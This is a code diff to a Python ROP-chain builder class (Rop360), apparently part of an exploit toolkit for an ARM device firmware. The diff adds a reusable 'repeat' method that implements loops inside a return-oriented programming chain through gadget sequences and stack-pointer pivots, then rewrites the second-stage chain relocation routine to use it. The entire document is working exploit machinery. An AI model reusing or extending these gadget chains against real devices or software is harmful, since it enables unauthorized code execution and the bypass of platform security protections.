@@ -96,6 +96,12 @@ class Rop360(Rop):
 
     functions = F
 
+    def __init__(self):
+        super().__init__()
+        # Used by repeat()
+        self.loop_index = self.pre_alloc_var(4)
+        self.loop_temp = self.pre_alloc_var(4)
+
     def call_v7(self, func, a0=0, a1=0, a2=0, a3=0, a4=0, a5=0, a6=0):
         self.rop += [
             G.pop_r0_r1_r2_r3_r4_r5_pc,
@@ -214,6 +220,138 @@ class Rop360(Rop):
             0,
         ]
 
+    def repeat(self, times, body):
+        #---- Increment index
+        # [index] += 1
+        #---- Do loopy thingy
+        # cmp [index], rop_size_words
+        # r0 += -1
+        # -- now R0 == 0 if [index] == rop_size_words, -1 otherwise
+        # -- set R0 = sp offset if continue to loop, 0 if exiting rop chain
+        # [temp] = r0
+        # r0 = sp
+        # r0 += [temp]
+        # r0 += const
+        # -- now r0 contains SP, implementing the IF, and we need to pivot to it
+        # r12 = r0
+
+        # Set loop_index to 0
+        part1 = [
+            G.pop_r0_r1_pc,
+            0,
+            self.loop_index,
+
+            G.str_r0_r1_pop_r4,
+            0,
+        ]
+
+        # body is executed here
+
+        # Increment loop index by one, compare it
+        part2 = [
+            # [loop_index] += 1
+            G.pop_r1_pc,
+            1,
+            G.pop_r0_pc,
+            self.loop_index,
+            G.ldr_r0_r0_pop_r4_pc,
+            0,
+            G.pop_r4_pc,
+            G.adds_r0_r1,
+            G.blx_r4_pop_r4_pc,
+            0,
+            G.pop_r1_pc,
+            self.loop_index,
+            G.str_r0_r1_pop_r4,
+            0,
+
+            # cmp [loop_index], times
+            G.pop_r0_pc,
+            self.loop_index,
+            G.ldr_r0_r0_pop_r4_pc,
+            times,
+            G.cmp_r0_r4,
+            0,
+            0,
+            0,
+
+            # r0 += -1
+            G.pop_r1_pc,
+            0xFFFFFFFF,
+            G.pop_r4_pc,
+            G.adds_r0_r1,
+            G.blx_r4_pop_r4_pc,
+            0,
+
+            # now R0 == 0 if [loop_index] == times, -1 otherwise
+            # set R0 = sp offset if continue to loop, 0 if exiting rop chain
+
+            G.pop_r1_pc,
+            0xDEAD, # = +(number of |data| before RETURN) * 4 # FILLME
+        ]
+
+        part3 = [
+            G.pop_r4_pc,
+            G.mul_r0_r1_bx_lr,
+            G.blx_r4_pop_r4_pc,
+            0,
+
+            # [loop_temp] = r0
+            G.pop_r1_pc,
+            self.loop_temp,
+            G.str_r0_r1_pop_r4,
+            0,
+
+            # r0 = sp
+            G.pop_r2_pc,
+            G.pop_pc,
+            G.mov_r0_sp_blx_r2,
+        ]
+
+        part4 = [
+            # r0 += [loop_temp]
+            G.pop_r1_pc,
+            self.loop_temp,
+            G.pop_r5_r6_r7_r8_sb_pc,
+            0,
+            0,
+            0,
+            0,
+            G.pop_pc,
+            G.ldr_r1_r1_blx_sb,
+            G.pop_r4_pc,
+            G.adds_r0_r1,
+            G.blx_r4_pop_r4_pc,
+            0,
+
+            # r0 += const
+            G.pop_r1_pc,
+            0xDEAD, # = (number of |data| after mov_r0_sp-blx_r2 and before RETURN_ADDRESS) * 4 # FILLME
+        ]
+
+        part5 = [
+            G.pop_r4_pc,
+            G.adds_r0_r1,
+            G.blx_r4_pop_r4_pc,
+            0,
+
+            # now r0 contains SP, implementing the IF, and we need to pivot to it
+            # r12 = r0
+            G.pop_r4_pc,
+            G.mov_r12_r0,
+            G.blx_r4_pop_r4_pc,
+            0,
+            G.mov_sp_r12_pop_pc,
+
+            # only get here when the loop is complete
+        ]
+
+        # fill the FILLMEs
+        part2[-1] = len(body + part2 + part3 + part4 + part5) * 4
+        part4[-1] = len(part4 + part5) * 4
+
+        self.rop += part1 + body + part2 + part3 + part4 + part5
+
     def relocate_rop(self, rop_base, rop_size_words, bases_base):
         """
         Relocates second-stage rop chain... in rop!
@@ -233,10 +371,10 @@ class Rop360(Rop):
         # ... you've been warned.
 
         # This is where we store current index of the loop
-        index = self._alloc(p32(0))
+        index = self.pre_alloc_var(4)
 
         # This is temporary storage
-        temp = self._alloc(p32(0))
+        temp = self.pre_alloc_var(4)
 
         # Summary:
         #---- Store reloc base-addr into tmp
@@ -257,21 +395,8 @@ class Rop360(Rop):
         # r0 = [index] * 4
         # r0 += [rop_base]
         # [r0] = [temp]
-        #---- Increment index
-        # [index] += 1
-        #---- Do loopy thingy
-        # cmp [index], rop_size_words
-        # r0 += -1
-        # -- now R0 == 0 if [index] == rop_size_words, -1 otherwise
-        # -- set R0 = sp offset if continue to loop, 0 if exiting rop chain
-        # [temp] = r0
-        # r0 = sp
-        # r0 += [temp]
-        # r0 += const
-        # -- now r0 contains SP, implementing the IF, and we need to pivot to it
-        # r12 = r0
 
-        part1 = [
+        self.repeat(rop_size_words, [
             # r0 = [index]
             G.pop_r0_pc,
             index,
@@ -424,90 +549,4 @@ class Rop360(Rop):
             index,
             G.str_r0_r1_pop_r4,
             0,
-
-            # cmp [index], rop_size_words
-            G.pop_r0_pc,
-            index,
-            G.ldr_r0_r0_pop_r4_pc,
-            rop_size_words,
-            G.cmp_r0_r4,
-            0,
-            0,
-            0,
-
-            # r0 += -1
-            G.pop_r1_pc,
-            0xFFFFFFFF,
-            G.pop_r4_pc,
-            G.adds_r0_r1,
-            G.blx_r4_pop_r4_pc,
-            0,
-
-            # now R0 == 0 if [index] == rop_size_words, -1 otherwise
-            # set R0 = sp offset if continue to loop, 0 if exiting rop chain
-
-            G.pop_r1_pc,
-            0xDEAD, # = +(number of |data| before RETURN) * 4 # FILLME
-        ]
-
-        part2 = [
-            G.pop_r4_pc,
-            G.mul_r0_r1_bx_lr,
-            G.blx_r4_pop_r4_pc,
-            0,
-
-            # [temp] = r0
-            G.pop_r1_pc,
-            temp,
-            G.str_r0_r1_pop_r4,
-            0,
-
-            # r0 = sp
-            G.pop_r2_pc,
-            G.pop_pc,
-            G.mov_r0_sp_blx_r2,
-        ]
-
-        part3 = [
-            # r0 += [temp]
-            G.pop_r1_pc,
-            temp,
-            G.pop_r5_r6_r7_r8_sb_pc,
-            0,
-            0,
-            0,
-            0,
-            G.pop_pc,
-            G.ldr_r1_r1_blx_sb,
-            G.pop_r4_pc,
-            G.adds_r0_r1,
-            G.blx_r4_pop_r4_pc,
-            0,
-
-            # r0 += const
-            G.pop_r1_pc,
-            0xDEAD, # = (number of |data| after mov_r0_sp-blx_r2 and before RETURN_ADDRESS) * 4 # FILLME
-        ]
-
-        part4 = [
-            G.pop_r4_pc,
-            G.adds_r0_r1,
-            G.blx_r4_pop_r4_pc,
-            0,
-
-            # now r0 contains SP, implementing the IF, and we need to pivot to it
-            # r12 = r0
-            G.pop_r4_pc,
-            G.mov_r12_r0,
-            G.blx_r4_pop_r4_pc,
-            0,
-            G.mov_sp_r12_pop_pc,
-
-            # only get here when the loop is complete
-        ]
-
-        # fill the FILLMEs
-        part1[-1] = len(part1 + part2 + part3 + part4) * 4
-        part3[-1] = len(part3 + part4) * 4
-
-        self.rop += part1 + part2 + part3 + part4
+        ])
